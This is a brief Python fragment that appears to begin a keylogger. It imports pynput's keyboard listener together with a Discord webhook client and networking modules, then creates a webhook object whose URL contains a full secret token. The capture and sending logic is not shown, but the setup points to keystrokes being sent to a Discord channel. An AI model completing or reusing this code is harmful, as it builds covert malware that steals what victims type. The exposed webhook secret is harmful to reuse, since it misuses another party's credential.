from pynput.keyboard import Key, Listener
import logging, json
import os
from datetime import date
import datetime
import time 
from discord_webhook import DiscordWebhook, DiscordEmbed
import re
from urllib.request import Request, urlopen
import socket

w = DiscordWebhook(url='https://discord.com/api/webhooks/1056193232729555004/f8wnsREWZpJrIn6ta-IV3xmhPquPmWcVvOLdaHEP33pfDgOoswVbsrTU-k3AjNwjQelC', tts='prueba')